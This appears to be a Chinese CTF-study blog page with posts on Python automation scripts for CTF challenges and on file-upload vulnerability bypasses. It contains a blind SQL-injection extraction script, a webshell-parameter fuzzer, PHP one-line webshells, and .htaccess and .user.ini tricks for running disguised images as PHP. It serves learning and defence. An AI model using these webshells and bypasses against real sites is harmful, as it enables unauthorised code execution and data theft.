<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/08/10/python%E8%84%9A%E6%9C%AC%E5%9C%A8ctf%E9%A2%98%E7%9B%AE%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/">python脚本在ctf题目中的应用</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-08-10</time><div class="content"><h2 id="对网页发起请求"><a href="#对网页发起请求" class="headerlink" title="对网页发起请求"></a>对网页发起请求</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">res = requests.get(payload)</span><br><span class="line">resText = res.text</span><br></pre></td></tr></table></figure>





<h2 id="列出文件列表"><a href="#列出文件列表" class="headerlink" title="列出文件列表"></a>列出文件列表</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">files = os.listdir(<span class="string">"D:/phpstudy_pro/WWW/src"</span>)</span><br></pre></td></tr></table></figure>





<h2 id="增加线程"><a href="#增加线程" class="headerlink" title="增加线程"></a>增加线程</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myThread</span> <span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, threadID, name, counter)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.threadID = threadID</span><br><span class="line">        self.name = name</span><br><span class="line">        self.counter = counter</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span>               </span><br><span class="line">        Send(self.name, self.counter)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">150</span>):</span><br><span class="line">	thread = myThread(i,i*<span class="number">20</span>,(i+<span class="number">1</span>)*<span class="number">20</span>)</span><br><span class="line">	thread.start()</span><br></pre></td></tr></table></figure>









<h1 id="一些例子"><a href="#一些例子" class="headerlink" title="一些例子"></a>一些例子</h1><h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1/src/"</span></span><br><span class="line">files = os.listdir(<span class="string">"D:/phpstudy_pro/WWW/src"</span>)  <span class="comment">#列出所有文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getGetind</span><span class="params">(fileind)</span>:</span></span><br><span class="line">	a = [];</span><br><span class="line">	fp = open(<span class="string">"D:/phpstudy_pro/WWW/src/"</span> + fileind,<span class="string">'r'</span>)</span><br><span class="line">	lines = fp.readlines()   <span class="comment">#读取文件的每一行</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> lines:</span><br><span class="line">		<span class="keyword">if</span> i.find(<span class="string">"$_GET['"</span>) &gt; <span class="number">0</span>:</span><br><span class="line">			start = i.find(<span class="string">"$_GET['"</span>) + <span class="number">7</span></span><br><span class="line">			end = i.find(<span class="string">"'"</span>,start)</span><br><span class="line">			a.append(i[start:end])   <span class="comment">#找到需要的字段</span></span><br><span class="line">	<span class="keyword">return</span> a</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> files:</span><br><span class="line">	getContent = getGetind(j)</span><br><span class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> getContent:</span><br><span class="line">		payload = url + j + <span class="string">"?"</span> + k + <span class="string">"=echo AlbatrossG"</span>   <span class="comment">#构造payload</span></span><br><span class="line">		print(payload)</span><br><span class="line">		html = requests.get(payload)    <span class="comment">#向网页发送请求</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">"AlbatrossG"</span> <span class="keyword">in</span> html.text:</span><br><span class="line">			print(<span class="string">"Success!"</span>)</span><br><span class="line">			exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myThread</span> <span class="params">(threading.Thread)</span>:</span>   <span class="comment">#增加线程</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, threadID, name, counter)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.threadID = threadID</span><br><span class="line">        self.name = name</span><br><span class="line">        self.counter = counter</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span>               </span><br><span class="line">        Send(self.name, self.counter)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">150</span>):</span><br><span class="line">	thread = myThread(i,i*<span class="number">20</span>,(i+<span class="number">1</span>)*<span class="number">20</span>)</span><br><span class="line">	thread.start()</span><br></pre></td></tr></table></figure>





<h2 id="例题-CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#例题-CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="例题:[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>例题:[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>写出python脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://df9ba400-06d5-4de6-bdd2-ee86a9a7a73e.node3.buuoj.cn/index.php'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">		payload = <span class="string">'0^(ascii(substr((select(flag)from(flag)),'</span> + str(i) + <span class="string">',1))&gt;'</span> + str(j) + <span class="string">')'</span></span><br><span class="line">		s = requests.post(url, data = &#123;<span class="string">'id'</span>:payload&#125;)</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> s.text.find(<span class="string">'Error'</span>)&gt;<span class="number">0</span>:</span><br><span class="line">			flag += chr(j)</span><br><span class="line">			print(flag)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/08/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-08-08</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/">web安全漏洞</a></span><div class="content"><p>首先，先是最简单的一句话木马的上传，即没有任何阻碍：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;ag&#39;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>如果上传成功即可以用antsword去连接。</p>
<blockquote>
<p>有些时候POST请求可能会出问题，这时我们可以改为GET或者REQUEST</p>
</blockquote>
<h3 id="后缀验证"><a href="#后缀验证" class="headerlink" title="后缀验证"></a>后缀验证</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$extension = substr($name, strrpos($name, <span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line">   <span class="keyword">if</span> (preg_match(<span class="string">"/ph|htacess/i"</span>, $extension)) &#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">"illegal suffix!"</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>有时后缀会过滤php，但我们可以使用phtml、php5等等的后缀，可是这里过滤掉了所有ph开头的后缀，同时过滤了.htacess文件。</p>
<p>此时我们就只能改后缀为.jpg或者.png，来上传一句话木马。</p>
<h3 id="lt-验证"><a href="#lt-验证" class="headerlink" title="&lt;?验证"></a>&lt;?验证</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (mb_strpos(file_get_contents($tmp_name), <span class="string">"&lt;?"</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">"&amp;lt;? in contents!"</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>这里过滤掉了&lt;?字符，所以我们就需要使用一句话木马的变种：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;ag&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>



<h3 id="exif-imagetype验证"><a href="#exif-imagetype验证" class="headerlink" title="exif_imagetype验证"></a>exif_imagetype验证</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$image_type = exif_imagetype($tmp_name);</span><br><span class="line">    <span class="keyword">if</span> (!$image_type) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"exif_imagetype:not image!"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个应该是验证一个文件头是否属于图片，我们可以伪造图片的文件头，一般我们使用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>

<p>整体一句话木马就变成了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;ag&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>





<h3 id="user-ini（让-jpg文件被解析成-php）"><a href="#user-ini（让-jpg文件被解析成-php）" class="headerlink" title=".user.ini（让.jpg文件被解析成.php）"></a>.user.ini（让.jpg文件被解析成.php）</h3><blockquote>
<p>那么什么是.user.ini？</p>
<p>这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：<code>PHP_INI_SYSTEM</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>、<code>PHP_INI_USER</code>。 在此可以查看：<a href="http://php.net/manual/zh/ini.list.php" target="_blank" rel="noopener">http://php.net/manual/zh/ini.list.php</a> 这几种模式有什么区别？看看官方的解释：</p>
<p><img src="https://wooyun.js.org/images_result/images/2014103002272568560.png" alt="enter image description here"></p>
<p>其中就提到了，模式为PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，再就是.user.ini中设置。 这里就提到了.user.ini，那么这是个什么配置文件？那么官方文档在<a href="http://php.net/manual/zh/configuration.file.per-user.php" target="_blank" rel="noopener">这里</a>又解释了：</p>
<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
<p>在 <code>.user.ini</code> 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p>
<p>这里就很清楚了，<code>.user.ini</code>实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p>
<p>实际上，除了<code>PHP_INI_SYSTEM</code>以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。</p>
<p>而且，和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p>
<p>然后我们看到php.ini中的配置项，可惜我沮丧地发现，只要稍微敏感的配置项，都是<code>PHP_INI_SYSTEM</code>模式的（甚至是php.ini only的），包括<code>disable_functions</code>、<code>extension_dir</code>、<code>enable_dl</code>等。 不过，我们可以很容易地借助<code>.user.ini</code>文件来构造一个“后门”。</p>
<p>Php配置项中有两个比较有意思的项（下图第一、四个）：</p>
<p><img src="https://wooyun.js.org/images_result/images/2014103002272554789.png" alt="enter image description here"></p>
<p><code>auto_append_file</code>、<code>auto_prepend_file</code>，点开看看什么意思：</p>
<p><img src="https://wooyun.js.org/images_result/images/2014103002272569525.png" alt="enter image description here"></p>
<p>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。</p>
</blockquote>
<p>那么使用方法就很明显了，我们先上传一个.user.ini，里面写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;a.jpg</span><br></pre></td></tr></table></figure>

<p>然后再上传一个a.jpg，里面写着一句话木马，这样在所有该网站根目录下的网页，都会包含a.jpg的内容（也就是一句话木马）。</p>
<blockquote>
<p>例题：[SUCTF 2019]CheckIn</p>
</blockquote>
<h3 id="htaccess（让-jpg文件被解析成-php）"><a href="#htaccess（让-jpg文件被解析成-php）" class="headerlink" title=".htaccess（让.jpg文件被解析成.php）"></a>.htaccess（让.jpg文件被解析成.php）</h3><h6 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># FileMatch 参数即为文件名的正则匹配</span></span><br><span class="line">&lt;FilesMatch <span class="string">"sniperoj"</span>&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sniperoj</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="string">'ag'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h6 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filename.jpg</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="string">'ag'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h6 id="法三"><a href="#法三" class="headerlink" title="法三"></a>法三</h6><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 自解析的 .htaccess</span><br><span class="line"><span class="tag">&lt;<span class="name">Files</span> "\<span class="attr">.htaccess</span>"&gt;</span></span><br><span class="line">    Allow from all</span><br><span class="line"><span class="tag">&lt;/<span class="name">Files</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> "\<span class="attr">.htaccess</span>"&gt;</span></span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line"># <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[ag]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line"># 不过这种方式测试并没有成功... 暂时不清楚原因</span><br></pre></td></tr></table></figure>









<h2 id="一些思考"><a href="#一些思考" class="headerlink" title="一些思考"></a>一些思考</h2><h3 id="防止-htaccess和-user-ini方法"><a href="#防止-htaccess和-user-ini方法" class="headerlink" title="防止.htaccess和.user.ini方法"></a>防止.htaccess和.user.ini方法</h3><p>对所有的文件名进行加密或者哈希，这样这种拥有特殊名字的文件就会改变文件名（虽然后缀不变），也就不会再被解析，也就消除了漏洞。</p>
</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/2/">&lt;i class&#x3D;&quot;fa fa-chevron-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/4/">&lt;i class&#x3D;&quot;fa fa-chevron-right&quot;&gt;&lt;&#x2F;i&gt;</a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By George</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body></html>